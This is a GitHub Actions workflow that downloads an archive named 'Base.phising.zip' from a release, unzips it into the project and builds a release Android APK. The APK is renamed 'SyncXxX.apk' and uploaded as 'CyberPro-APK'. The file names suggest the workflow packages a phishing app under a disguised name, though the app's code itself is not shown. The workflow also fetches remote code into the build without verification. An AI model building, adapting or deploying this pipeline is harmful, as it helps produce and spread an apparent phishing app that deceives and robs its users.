name: Build KawakunChan

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      actions: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Download Base from Release
        run: |
          curl -L -o base.zip \
            https://github.com/KawakunChan/Db/releases/download/v1.0.0/Base.phising.zip
          if [ -f "base.zip" ]; then
            echo "✅ Download sukses!"
            unzip -o base.zip
            rm base.zip
          else
            echo "❌ Download gagal!"
            exit 1
          fi

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Pillow
        run: pip install Pillow

      - name: Generate App Icons
        run: python3 generate_icons.py

      - name: Generate Debug Keystore
        run: |
          cd android/app
          keytool -genkey -v -keystore debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug, O=Android, C=US"

      - name: Setup Gradle Wrapper
        run: |
          curl -L -o android/gradle/wrapper/gradle-wrapper.jar \
            "https://github.com/gradle/gradle/raw/v8.4.0/gradle/wrapper/gradle-wrapper.jar"
          chmod +x android/gradlew

      - name: Build Release APK
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon

      - name: Rename APK
        run: |
          mkdir -p output
          find android/app/build/outputs/apk/release/ -name "*.apk" | head -1 | xargs -I{} cp {} output/SyncXxX.apk

      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: CyberPro-APK
          path: output/SyncXxX.apk
          retention-days: 30
